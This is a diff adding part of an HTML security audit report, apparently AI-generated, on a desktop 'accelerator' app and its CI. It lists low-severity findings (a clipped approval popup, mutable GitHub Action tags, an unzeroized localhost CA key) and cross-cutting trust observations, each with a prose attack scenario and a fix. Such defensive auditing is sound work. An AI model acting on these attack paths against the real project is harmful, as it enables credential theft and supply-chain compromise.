+    <p><strong>What it is.</strong> The site-approval popup is a fixed-size, non-scrolling window. A very long origin wraps and overflows it, so the origin box and/or the Allow/Deny buttons can get clipped off-screen — and "Remember this site" is already ticked.</p>
+    <p><strong>What an attacker would do.</strong> Present a long, confusing origin so the trust-relevant part (the real registrable domain) is pushed out of view when the user makes an approve/deny decision. Because the text wraps rather than cleanly truncating, all characters are technically present — which is why this is low, not medium.</p>
+    <p><strong>The fix.</strong> Truncate with a middle-ellipsis that always keeps the registrable domain visible, let the popup scroll, and default "Remember" to unchecked.</p>
+  </div>
+  <details><summary>Technical trace</summary>
+    <div class="trace">
+    <p><strong>Instances:</strong> <code>packages/accelerator/src-tauri/frontend/authorize.html:20,23,38</code>; <code>packages/accelerator/src-tauri/frontend/style.css</code> (<code>.popup-detail</code> word-break; <code>.popup-container</code> fixed height)</p>
+    <p><strong>Trace:</strong> <code>.popup-detail { word-break: break-all }</code> inside <code>.popup-container { height: calc(100vh-40px) }</code>, no scroll → long origin overflows/clips; <code>#remember</code> pre-checked (authorize.html:23).</p>
+    <p><strong>Fix:</strong> middle-ellipsis preserving eTLD+1, scrollable popup, uncheck Remember by default.</p>
+    </div>
+  </details>
+</div>
+
+<!-- F-015 -->
+<div class="finding">
+  <div class="finding-header">
+    <span class="chip chip-low">Low</span>
+    <span class="finding-id">F-015</span>
+    <span class="finding-title">Third-party Actions pinned by mutable tag — including the AWS-cred action</span>
+  </div>
+  <div class="meta-line">
+    <span class="chip chip-info">Found by Claude</span>
+    <span class="chip chip-info">confidence: high</span>
+    <span class="chip chip-info">CWE-1357</span>
+    <span class="chip chip-info">fix: hours</span>
+  </div>
+  <div class="eli5">
+    <p><strong>What it is.</strong> Most third-party GitHub Actions are referenced by a moving tag like <code>@v6</code> rather than a fixed commit hash — including the action that mints the AWS deploy session. One action (<code>create-github-app-token</code>) is already hash-pinned, so this is an inconsistency, not a policy gap.</p>
+    <p><strong>What an attacker would do.</strong> Compromise one of those action repos and move the tag; the next CI run pulls the malicious version and, for the AWS-cred action, hands over the deploy session.</p>
+    <p><strong>The fix.</strong> Pin every third-party action to a full commit SHA, as already done for one of them.</p>
+  </div>
+  <details><summary>Technical trace</summary>
+    <div class="trace">
+    <p><strong>Instances:</strong> <code>.github/workflows/*</code> (e.g. <code>aws-actions/configure-aws-credentials@v6</code>)</p>
+    <p><strong>Trace:</strong> mutable major-tag refs for third-party actions vs SHA-pinned <code>create-github-app-token</code>.</p>
+    <p><strong>Fix:</strong> SHA-pin all third-party actions.</p>
+    </div>
+  </details>
+</div>
+
+<!-- F-016 -->
+<div class="finding">
+  <div class="finding-header">
+    <span class="chip chip-low">Low</span>
+    <span class="finding-id">F-016</span>
+    <span class="finding-title">Localhost CA signing key is not explicitly zeroized from memory</span>
+  </div>
+  <div class="meta-line">
+    <span class="chip chip-info">Found by Claude</span>
+    <span class="chip chip-info">confidence: moderate</span>
+    <span class="chip chip-info">CWE-212</span>
+    <span class="chip chip-info">fix: hours</span>
+  </div>
+  <div class="eli5">
+    <p><strong>What it is.</strong> The app generates a short-lived certificate authority (CA) key in memory to sign its localhost HTTPS certificate, and deliberately never writes it to disk — a good design. It enables the crypto library's "zeroize" feature but never actually calls it, and whether the library scrubs the underlying key material on its own isn't verifiable from this repo.</p>
+    <p><strong>What an attacker would do.</strong> An attacker who can already read the app's process memory (via a core dump, ptrace, or swap — which needs the same user or root) might recover the CA key and mint fake localhost certificates. Because that attacker already has high privilege and the CA is limited to localhost names, the extra gain is small.</p>
+    <p><strong>The fix.</strong> Wrap the key material in a <code>Zeroizing</code> container or confirm the library scrubs it on drop; document the residual in-memory window.</p>
+  </div>
+  <details><summary>Technical trace</summary>
+    <div class="trace">
+    <p><strong>Instances:</strong> <code>packages/accelerator/src-tauri/src/certs.rs</code> (no <code>.zeroize()</code> call); <code>packages/accelerator/src-tauri/Cargo.toml:53</code> (rcgen <code>zeroize</code> feature)</p>
+    <p><strong>Trace:</strong> keyless-CA design; feature enabled but never invoked; rcgen 0.13 Drop scrubbing coverage (ring/aws-lc key vs outer DER) unverified here. Requires local memory read; CA NameConstraint-scoped to localhost.</p>
+    <p><strong>Fix:</strong> <code>Zeroizing</code> wrapper / confirm ZeroizeOnDrop coverage.</p>
+    </div>
+  </details>
+</div>
+
+<h2>Cross-cutting observations</h2>
+
+<h3>The SDK ↔ accelerator channel has no mutual identity</h3>
+<p>F-001, F-002, and F-011 are three faces of one habit: trusting a party that was never authenticated. The SDK trusts any local program that answers the health check; the app trusts any local program already holding its port; the origin comparator trusts a normalized string. A single design decision closes most of it — a per-install identity (a pinned key or token kept in the app's owner-only data folder) that the SDK uses to authenticate the server <em>and</em> the app uses to authenticate an existing instance. That one mechanism resolves F-001 and F-002 and makes the F-011 string-collapse far less consequential.</p>
+
+<h3>The witness is guarded in transit but not at rest</h3>
+<p>The app does the hard privacy work well — deny-by-default authorization, generic error messages that never echo internal paths, and no witness bytes in logs. The single gap (F-003) is one missing permission flag on the one place the witness touches disk. It's an hour of work, and it matters more than its severity band suggests for a tool whose entire purpose is privacy.</p>
+
+<h3>The update &amp; deploy path concentrates trust</h3>
+<p>F-004 (version not bound to the signed file), F-005 (whole-bucket write from unprotected branches), F-006 (an injectable token-bearing workflow), F-008 (a self-derived checksum pin), and F-015 (mutable action tags) are independent but compounding — each widens what a single stolen CI or owner credential can accomplish, from "publish one bad thing" toward "control the update channel and the hosted site." Tightening the cloud trust scope, splitting bucket write-access by folder, and binding update version to the signed artifact shrink the whole blast radius together, and are worth treating as one hardening initiative.</p>
+
+<h3>A small consistency gap: verified-site display names aren't validated</h3>
+<p>The curated <code>verified-sites.json</code> validates the <code>origin</code> field as ASCII but applies no such guard to the human-readable <code>displayName</code>, so a Trojan-Source-style bidirectional or zero-width payload could slip past single-curator review. Impact is minor — the raw origin is always shown as ground truth alongside the name — but a one-line ASCII/bidi check on <code>displayName</code> mirrors the guard the sibling field already has.</p>
+
+<footer>
+  Engineering detail: <a href="report.md">report.md</a> ·
+  <a href="findings/verified.md">verified findings</a> ·
+  <a href="findings/consolidated.md">consolidated findings</a> ·
+  <a href="raw/">raw cluster outputs</a>
+  <br>Generated by the <code>/harden</code> skill (security focus, high effort). 10 clusters × Claude + Codex. Links are relative — this file lives inside the run's audit directory.
+</footer>
+
+</body>
+</html>
